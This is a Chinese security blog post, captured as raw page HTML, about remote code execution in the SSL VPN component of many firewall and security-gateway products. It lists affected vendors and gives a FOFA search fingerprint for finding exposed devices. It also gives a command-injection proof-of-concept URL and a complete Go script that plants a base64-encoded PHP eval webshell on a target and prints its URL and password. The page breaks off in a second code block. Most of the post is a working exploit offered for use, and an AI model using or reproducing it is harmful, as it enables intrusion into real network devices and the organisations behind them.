@@ -1,0 +1,1129 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>多个防火墙产品RCE - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="多个防火墙产品RCE" />
+<meta property="og:description" content="多个防火墙产品RCE 影响版本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 H3C-下一代防火墙 安恒信息-明御安全网关 MAiPU-安全网关 D_Link-下一代防" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81rce/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-08T01:08:29+08:00" />
+<meta property="article:modified_time" content="2023-12-08T01:08:29+08:00" /><meta property="og:site_name" content="Chinchin&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="多个防火墙产品RCE"/>
+<meta name="twitter:description" content="多个防火墙产品RCE 影响版本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 H3C-下一代防火墙 安恒信息-明御安全网关 MAiPU-安全网关 D_Link-下一代防"/>
+<meta name="twitter:site" content="@xxxx"/>
+<meta name="application-name" content="Chinchin&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Chinchin&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81rce/" /><link rel="prev" href="http://example.org/%E5%A4%A7%E4%B8%BA-lnnojet-%E7%9F%A5%E8%AF%86%E4%BA%A7%E6%9D%83%E5%8D%8F%E5%90%8C%E5%88%9B%E6%96%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/" /><link rel="next" href="http://example.org/%E5%9F%BA%E4%BA%8Etypora-dom%E7%9A%84%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Ccve-2023-2317/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "多个防火墙产品RCE",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81rce\/"
+        },"genre": "posts","keywords": "2023hw漏洞","wordcount":  1774 ,
+        "url": "http:\/\/example.org\/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81rce\/","datePublished": "2023-12-08T01:08:29+08:00","dateModified": "2023-12-08T01:08:29+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Chinchin"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chinchin&#39;s blog"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chinchin&#39;s blog"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">多个防火墙产品RCE</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/2023hw%E6%BC%8F%E6%B4%9E/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>2023hw漏洞</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1774 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#多个防火墙产品rce">多个防火墙产品RCE</a></li>
+    <li><a href="#影响版本">影响版本</a></li>
+    <li><a href="#fofa">fofa</a></li>
+    <li><a href="#poc">poc</a></li>
+    <li><a href="#批量利用脚本">批量利用脚本</a></li>
+    <li><a href="#另外一个点">另外一个点</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="多个防火墙产品rce">多个防火墙产品RCE</h2>
+<h2 id="影响版本">影响版本</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">H3C-下一代防火墙
+</span></span><span class="line"><span class="cl">安恒信息-明御安全网关
+</span></span><span class="line"><span class="cl">MAiPU-安全网关
+</span></span><span class="line"><span class="cl">D_Link-下一代防火墙
+</span></span><span class="line"><span class="cl">HUAWEI-公司产品
+</span></span><span class="line"><span class="cl">迈普通信技术股份有限公司安全网关
+</span></span><span class="line"><span class="cl">博达通信-下一代防火墙
+</span></span><span class="line"><span class="cl">任天行网络安全管理系统\安全审计系统
+</span></span><span class="line"><span class="cl">安博通应用网关
+</span></span><span class="line"><span class="cl">烽火网络安全审计
+</span></span><span class="line"><span class="cl">瑞斯康达科技发展股份有限公司安全路由器
+</span></span><span class="line"><span class="cl">任子行网络安全审计系统
+</span></span><span class="line"><span class="cl">绿盟安全审计系统
+</span></span><span class="line"><span class="cl">深圳市鑫塔科技有限公司第二代防火墙
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="fofa">fofa</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">body=&#34;/webui/images/default/default/alert_close.jpg&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="poc">poc</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/sslvpn/sslvpn_client.php?client=logoImg&amp;img=%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/ceshi.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="批量利用脚本">批量利用脚本</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;crypto/tls&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;fmt&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;github.com/fatih/color&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;github.com/hpifu/go-kit/hflag&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;github.com/imroc/req/v3&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;github.com/thanhpk/randstr&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;net/http&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;strings&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;time&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">reqHeader</span> <span class="p">=</span> <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;User-Agent&#34;</span><span class="p">:</span>      <span class="s">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;Accept&#34;</span><span class="p">:</span>          <span class="s">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s">&#34;gzip, deflate, br&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s">&#34;zh-CN,zh-TW;q=0.9,zh;q=0.8&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;Connection&#34;</span><span class="p">:</span>      <span class="s">&#34;close&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">hflag</span><span class="p">.</span><span class="nf">AddFlag</span><span class="p">(</span><span class="s">&#34;target&#34;</span><span class="p">,</span> <span class="s">&#34;SSLVPN系统地址&#34;</span><span class="p">,</span> <span class="nx">hflag</span><span class="p">.</span><span class="nf">Required</span><span class="p">(),</span> <span class="nx">hflag</span><span class="p">.</span><span class="nf">Shorthand</span><span class="p">(</span><span class="s">&#34;t&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nx">err2</span> <span class="o">:=</span> <span class="nx">hflag</span><span class="p">.</span><span class="nf">Parse</span><span class="p">();</span> <span class="nx">err2</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">       <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">hflag</span><span class="p">.</span><span class="nf">Usage</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">       <span class="k">return</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">targetHost</span> <span class="o">:=</span> <span class="nx">hflag</span><span class="p">.</span><span class="nf">GetString</span><span class="p">(</span><span class="s">&#34;target&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">filename</span> <span class="o">:=</span> <span class="nx">randstr</span><span class="p">.</span><span class="nf">Hex</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#34;.php&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">vulPath</span> <span class="o">:=</span> <span class="s">&#34;/sslvpn/sslvpn_client.php?client=logoImg&amp;img=/tmp|echo%20PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2MnXSk7Pz4=|base64%20-d|tee%20/usr/local/webui/sslvpn/&#34;</span> <span class="o">+</span> <span class="nx">filename</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">fullURL</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Replace</span><span class="p">(</span><span class="nx">targetHost</span><span class="o">+</span><span class="nx">vulPath</span><span class="p">,</span> <span class="s">&#34;//ss&#34;</span><span class="p">,</span> <span class="s">&#34;/ss&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">cli</span> <span class="o">:=</span> <span class="nf">reqCli</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">get</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">cli</span><span class="p">.</span><span class="nf">R</span><span class="p">().</span><span class="nf">Get</span><span class="p">(</span><span class="nx">fullURL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">       <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">       <span class="k">return</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">defer</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">       <span class="nx">_</span> <span class="p">=</span> <span class="nx">get</span><span class="p">.</span><span class="nx">Body</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}()</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">shellURL</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Replace</span><span class="p">(</span><span class="nx">targetHost</span><span class="o">+</span><span class="s">&#34;/sslvpn/&#34;</span><span class="o">+</span><span class="nx">filename</span><span class="p">,</span> <span class="s">&#34;//ss&#34;</span><span class="p">,</span> <span class="s">&#34;/ss&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nx">get</span><span class="p">.</span><span class="nx">StatusCode</span> <span class="o">==</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusOK</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">       <span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">get</span><span class="p">.</span><span class="nf">String</span><span class="p">(),</span> <span class="s">&#34;|base64 -d|tee /usr/local/webui/sslvpn/&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">         <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">color</span><span class="p">.</span><span class="nf">RedString</span><span class="p">(</span><span class="s">&#34;\nShell URL Is : %s\nShell Pass is : c\n&#34;</span><span class="p">,</span> <span class="nx">shellURL</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">         <span class="k">return</span>
+</span></span><span class="line"><span class="cl">       <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">color</span><span class="p">.</span><span class="nf">GreenString</span><span class="p">(</span><span class="s">&#34;\n%s&#34;</span><span class="p">,</span> <span class="s">&#34;站点安全不存在漏洞&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">reqCli</span><span class="p">()</span> <span class="o">*</span><span class="nx">req</span><span class="p">.</span><span class="nx">Client</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">cli</span> <span class="o">:=</span> <span class="nx">req</span><span class="p">.</span><span class="nf">C</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="nx">k</span><span class="p">,</span> <span class="nx">v</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">reqHeader</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">       <span class="nx">cli</span><span class="p">.</span><span class="nf">SetCommonHeader</span><span class="p">(</span><span class="nx">k</span><span class="p">,</span> <span class="nx">v</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">cli</span><span class="p">.</span><span class="nf">SetTimeout</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span> <span class="o">*</span> <span class="mi">10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">cli</span><span class="p">.</span><span class="nf">SetTLSFingerprintSafari</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">cli</span><span class="p">.</span><span class="nf">SetAutoDecodeAllContentType</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">cli</span><span class="p">.</span><span class="nx">TLSClientConfig</span> <span class="p">=</span> <span class="o">&amp;</span><span class="nx">tls</span><span class="p">.</span><span class="nx">Config</span><span class="p">{</span><span class="nx">InsecureSkipVerify</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">       <span class="nx">MinVersion</span><span class="p">:</span> <span class="nx">tls</span><span class="p">.</span><span class="nx">VersionTLS10</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">       <span class="nx">MaxVersion</span><span class="p">:</span> <span class="nx">tls</span><span class="p">.</span><span class="nx">VersionTLS13</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">cli</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
